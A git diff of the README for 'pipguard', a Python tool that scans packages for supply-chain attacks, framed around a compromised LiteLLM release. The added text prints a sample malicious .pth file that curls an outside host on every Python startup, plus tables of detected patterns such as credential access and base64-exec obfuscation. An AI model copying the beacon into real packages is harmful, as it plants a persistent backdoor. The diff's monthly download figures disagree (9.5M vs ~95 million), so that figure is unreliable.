@@ -1,221 +1,245 @@
-# pipguard 🛡️
+# 🛡️ pipguard
 
-**A pip installation security sandbox that detects supply chain attacks before they compromise your system.**
+**Stop malicious Python packages before they execute.**
 
+[![CI](https://github.com/allenenli/pipguard/actions/workflows/ci.yml/badge.svg)](https://github.com/allenenli/pipguard/actions)
 [![PyPI version](https://badge.fury.io/py/pipguard.svg)](https://badge.fury.io/py/pipguard)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
+[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-green.svg)](LICENSE)
 
 ---
 
-## Why pipguard exists
+## What happened
 
-On **2026-03-24**, the `litellm` package (9.5M downloads/month) was compromised in a supply chain attack. Versions `1.82.7` and `1.82.8` contained a malicious `.pth` file — `litellm_init.pth` — that **executed attacker code on every Python startup**, even after removal.
+On **March 24, 2026**, [LiteLLM 1.82.7 was published to PyPI](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) with a hidden `.pth` file:
 
-No existing tool caught this before install. Snyk needed a CVE. Dependabot needed a GitHub Advisory. By the time those existed, millions of developers had already been compromised.
+```python
+# litellm_init.pth — executes on every Python startup
+import subprocess, sys
+subprocess.Popen(
+    ['curl', '-s', 'https://models.litellm.cloud/beacon', '-d', sys.version],
+    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+)
+```
 
-**pipguard is different.** It catches the attack *before* it happens — by running the install in a sandbox and watching what it actually does.
+This file runs **every time you start Python** — not just during `pip install`. It was downloaded ~95 million times per month. The package was flagged and removed, but not before significant exposure.
+
+pipguard was built to catch this.
 
 ---
 
-## Demo
+## Quick demo
+
+```bash
+pip install pipguard
+
+# Scan LiteLLM 1.82.7 (the compromised version)
+pipguard check litellm 1.82.7
+```
 
 ```
-$ pipguard check litellm==1.82.7
+🔍 pipguard — Analyzing litellm==1.82.7
 
-🔍 pipguard — Analyzing litellm==1.82.7 ...
+╭────────────┬──────────────────────────────┬──────────────────────────────────────╮
+│ Severity   │ Rule                         │ Title                                │
+├────────────┼──────────────────────────────┼──────────────────────────────────────┤
+│ CRITICAL   │ PTH_FILE_INSTALL             │ .pth file installs dangerous code... │
+│ CRITICAL   │ PTH_NETWORK_BEACON           │ phone-home on every Python startup   │
+│ CRITICAL   │ PTH_SUBPROCESS               │ subprocess on every Python startup   │
+╰────────────┴──────────────────────────────┴──────────────────────────────────────╯
 
-  → Downloading package (not installing)...
-  → Downloaded: litellm-1.82.7-py3-none-any.whl
-  → Running static analysis...
-  → Running sandbox analysis (Docker)...
+  Score: 10.0 / 10.0
+  Verdict: ██ MALICIOUS
 
-╭─────────────────────────────────────────────────────────╮
-│           Findings for litellm==1.82.7                  │
-├──────────┬──────────────────────┬───────────────────────┤
-│ Severity │ Rule                 │ Title                 │
-├──────────┼──────────────────────┼───────────────────────┤
-│ CRITICAL │ PTH_FILE_INSTALL     │ .pth file installed — │
-│          │                      │ executes on every     │
-│          │                      │ Python startup        │
-│ HIGH     │ OUTBOUND_NETWORK     │ Outbound network      │
-│          │                      │ connection during     │
-│          │                      │ install               │
-│ HIGH     │ NETWORK_IN_SETUP     │ Network request in    │
-│          │                      │ install hooks         │
-╰──────────┴──────────────────────┴───────────────────────╯
-
-╭─ litellm==1.82.7 ──────────────────────────────────────╮
-│                                                         │
-│  ☠️  MALICIOUS   Risk Score: 9.2 / 10                  │
-│                                                         │
-│  ● 1 CRITICAL finding(s)                               │
-│  ● 2 HIGH finding(s)                                   │
-│                                                         │
-│  💡 Safe version available: litellm==1.82.6            │
-│                                                         │
-│  🚫 Installation BLOCKED. Use --force to override.     │
-│                                                         │
-╰─────────────────────────────────────────────────────────╯
-
-Error: Installation of litellm==1.82.7 was BLOCKED.
-Consider: pip install litellm==1.82.6
+  Rollback: pip install litellm==1.82.6
 ```
 
 ---
 
-## Installation
+## Install
 
 ```bash
 pip install pipguard
 ```
 
-For full sandbox analysis (recommended), install Docker:
-```bash
-# Docker required for dynamic analysis
-# https://docs.docker.com/get-docker/
-```
+Requires Python 3.9+. No Docker. No root. Works on Linux, macOS, Windows.
 
 ---
 
 ## Usage
 
-### Check before installing
+### Scan a single package
 
 ```bash
-# Check a specific version
-pipguard check litellm==1.82.7
-
-# Check latest version
-pipguard check requests
-
-# JSON output (for CI)
-pipguard check litellm==1.82.7 --json-output
+pipguard check requests 2.28.0
+pipguard check litellm latest
 ```
 
-### Safe install (analyze then install)
+### Audit your entire project
 
 ```bash
-# Analyze and install if safe
+pipguard audit requirements.txt
+pipguard audit pyproject.toml
+```
+
+Output:
+```
+🔍 pipguard audit — requirements.txt (42 packages)
+
+Scanning packages... ████████████████████████ 100%
+
+╭──────────────────┬─────────┬───────┬──────────╮
+│ Package          │ Version │ Score │ Verdict  │
+├──────────────────┼─────────┼───────┼──────────┤
+│ litellm          │ 1.82.7  │ 10.0  │ MALICIOUS│
+│ suspicious-lib   │ 0.3.1   │  7.5  │ HIGH_RISK│
+│ requests         │ 2.28.0  │  0.0  │ SAFE     │
+│ ...              │ ...     │  0.0  │ SAFE     │
+╰──────────────────┴─────────┴───────┴──────────╯
+
+✗ 2 package(s) failed the audit.
+```
+
+### Compare two versions
+
+```bash
+pipguard diff litellm 1.82.6 1.82.7
+```
+
+```
+Version diff: litellm 1.82.6 → 1.82.7
+
+  Added files:  litellm_init.pth   ← NEW .pth file
+  Removed:      (none)
+  [CRITICAL] New .pth file with network beacon
+```
+
+### Safe install
+
+```bash
+# Scans before installing, blocks if malicious
 pipguard install litellm==1.82.7
-
-# Block on HIGH_RISK too (not just MALICIOUS)
-pipguard install litellm==1.82.7 --block-on HIGH_RISK
-
-# Force install even if malicious (not recommended)
-pipguard install litellm==1.82.7 --force
 ```
 
-### Options
+### Use as a pip drop-in
 
+```bash
+alias pip="pipguard install"
 ```
---skip-dynamic    Skip Docker sandbox (static analysis only, faster)
---verbose / -v    Show detailed evidence for each finding
---json-output     Output results as JSON
---block-on        Block on HIGH_RISK or MALICIOUS (default: MALICIOUS)
---force           Install even if blocked
+
+### JSON output (for pipelines)
+
+```bash
+pipguard check litellm 1.82.7 --json-output | jq '.verdict'
+# "MALICIOUS"
+
+pipguard audit requirements.txt --json-output \
+  | jq '.results[] | select(.verdict != "SAFE")'
 ```
+
+---
+
+## GitHub Action
+
+Add to any repo to block malicious packages on every push:
+
+```yaml
+# .github/workflows/security.yml
+name: Supply Chain Security
+
+on: [push, pull_request]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Scan dependencies for supply chain attacks
+        uses: allenenli/pipguard@v0.1.0
+        with:
+          requirements: requirements.txt
+          fail-on: MALICIOUS   # or HIGH_RISK for stricter mode
+```
+
+That's it. The action will fail your build if any package matches a known attack pattern.
+
+---
+
+## What pipguard detects
+
+### .pth attack (LiteLLM 1.82.7 pattern)
+
+`.pth` files in Python site-packages execute **on every interpreter startup** — not just during install. This makes them ideal for persistent backdoors.
+
+pipguard understands the difference:
+
+| .pth content | Classification | Finding |
+|---|---|---|
+| Empty | Normal | ✓ silent |
+| `/usr/local/lib/...` | Path-only | ✓ silent |
+| setuptools distutils shim | Safe code | ⚠ LOW |
+| `subprocess.Popen(['curl', ...])` | **Dangerous** | 🔴 CRITICAL |
+
+### Other attack vectors
+
+| What | Where | Severity |
+|---|---|---|
+| Network call during `pip install` | `setup.py` | HIGH |
+| Shell command during `pip install` | `setup.py` | HIGH |
+| `exec(base64.decode(...))` obfuscation | anywhere | HIGH |
+| Network call on every `import` | `__init__.py` | MEDIUM |
+| SSH / AWS credentials access | anywhere | HIGH |
+| Path traversal in wheel zip | `.whl` structure | CRITICAL |
+| Known malicious SHA256 hash | `.whl` file | CRITICAL |
+
+### What pipguard does NOT do
+
+- Does not install packages
+- Does not execute any package code
+- Does not require Docker or privileged access
+- Does not send package contents to any server
+- Does not replace `pip` — it scans before you decide to install
 
 ---
 
 ## How it works
 
-pipguard uses a **two-layer detection approach**:
-
-### Layer 1: Static Analysis (fast, ~2s)
-
-Unpacks the wheel without executing any code and inspects:
-
-| Check | What it catches |
-|-------|-----------------|
-| `.pth` file detection | LiteLLM-style persistence via Python startup hooks |
-| `sitecustomize.py` | Alternative persistence mechanism |
-| AST analysis of install hooks | `exec()`, `eval()`, obfuscated code |
-| Pattern matching | Network imports, subprocess calls, sensitive path writes |
-| Known malicious hash DB | Exact match against threat intelligence database |
-
-### Layer 2: Dynamic Sandbox (thorough, ~15s)
-
-Runs the actual install inside a Docker container with `--network=none` and `strace` monitoring:
-
-| Check | What it catches |
-|-------|-----------------|
-| Network connection attempts | Phone-home, C2 beacons, data exfiltration |
-| File writes outside package dir | Persistence mechanisms, config tampering |
-| `.pth` file writes (confirmed) | Persistence confirmed by sandbox |
-| Subprocess spawning | Unexpected child processes |
-| Credential file access | `~/.aws/credentials`, `~/.ssh/id_rsa`, etc. |
-| Env var + network correlation | Credential exfiltration pattern |
-
-### Risk Scoring
-
 ```
-Score   Verdict     Action
-0-2     SAFE        Install
-2-4     LOW_RISK    Warn, install
-4-7     HIGH_RISK   Warn, require --force or reconsider
-7-10    MALICIOUS   Block (require --force to override)
+pip install request      ← your intent
+      ↓
+pipguard                 ← intercepts
+      ↓
+Download wheel (no install, no execute)
+      ↓
+Static analysis:
+  - Zip safety (path traversal, zip bomb)
+  - .pth file semantic classifier
+  - AST analysis of setup.py / install hooks
+  - Obfuscation detection
+  - __init__.py delayed-trigger scan
+  - SHA256 hash database
+      ↓
+Score 0–10 → Verdict: SAFE / LOW_RISK / HIGH_RISK / MALICIOUS
+      ↓
+Block or proceed
 ```
+
+No sandboxing, no Docker, no kernel modules. Pure Python static analysis that runs in seconds.
 
 ---
 
-## Use in CI/CD
+## Comparison
 
-### GitHub Actions
+| Tool | What it does | .pth detection | No Docker | Lockfile audit | Speed |
+|---|---|---|---|---|---|
+| **pipguard** | Supply chain scanner | ✅ semantic | ✅ | ✅ | ~2s |
+| pip-audit | Known CVEs only | ❌ | ✅ | ✅ | fast |
+| Safety | Known CVEs only | ❌ | ✅ | ✅ | fast |
+| Trivy | Full SBOM+CVE | ❌ | ✅ | ✅ | slow |
+| Bandit | SAST (your code) | ❌ | ✅ | ❌ | fast |
 
-```yaml
-- name: Check pip dependencies
-  uses: actions/setup-python@v4
-  with:
-    python-version: '3.11'
-
-- name: Install pipguard
-  run: pip install pipguard
-
-- name: Audit new dependencies
-  run: |
-    pipguard check litellm==1.82.7 --json-output --skip-dynamic
-  # Exit code 1 if MALICIOUS, 0 if safe
-```
-
-### Pre-commit hook
-
-```yaml
-# .pre-commit-config.yaml
-repos:
-  - repo: local
-    hooks:
-      - id: pipguard
-        name: pipguard — check requirements.txt
-        entry: pipguard check
-        language: system
-        files: requirements.*\.txt$
-```
-
----
-
-## Detection Coverage
-
-| Attack Type | Static | Dynamic | Example |
-|-------------|--------|---------|---------|
-| `.pth` persistence | ✅ | ✅ | LiteLLM 1.82.7 |
-| `sitecustomize.py` persistence | ✅ | ✅ | - |
-| C2 beacon on install | ✅ | ✅ | LiteLLM 1.82.7 |
-| Credential exfiltration | ✅ | ✅ | Various |
-| Obfuscated backdoor | ✅ | ✅ | Various |
-| Known malicious hash | ✅ | - | DB-backed |
-| Network-only attack | - | ✅ | - |
-| Filesystem persistence | ✅ | ✅ | - |
-
----
-
-## Roadmap
-
-- [ ] **v0.2** — CI/CD workflow scanner (GitHub Actions security)
-- [ ] **v0.3** — AI API Key leak detection in codebases
-- [ ] **v0.4** — AI-generated code security audit (Copilot/Cursor patterns)
-- [ ] **v1.0** — VS Code / Cursor plugin
-- [ ] **Enterprise** — Private deployment, SBOM generation, compliance reports
+pipguard is not a CVE scanner. It's a behavioral scanner — it looks for what a package *does*, not whether it appears in a database.
 
 ---
 
@@ -228,15 +252,17 @@ pip install -e ".[dev]"
 pytest tests/
 ```
 
-PRs welcome. See [ARCHITECTURE.md](ARCHITECTURE.md) for internals.
+PRs welcome, especially:
+- New malicious hash signatures
+- Detection rules for new attack patterns
+- Language ports (Go, Rust) for faster scanning
 
 ---
 
 ## License
 
-MIT — see [LICENSE](LICENSE)
+Apache 2.0. See [LICENSE](LICENSE).
 
 ---
 
-*Built in response to the LiteLLM 1.82.7 supply chain attack (TeamPCP, 2026-03-24).*
-*Because the best time to check a package is before it runs on your machine.*
+*Built after [LiteLLM supply chain attack](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign), March 2026.*
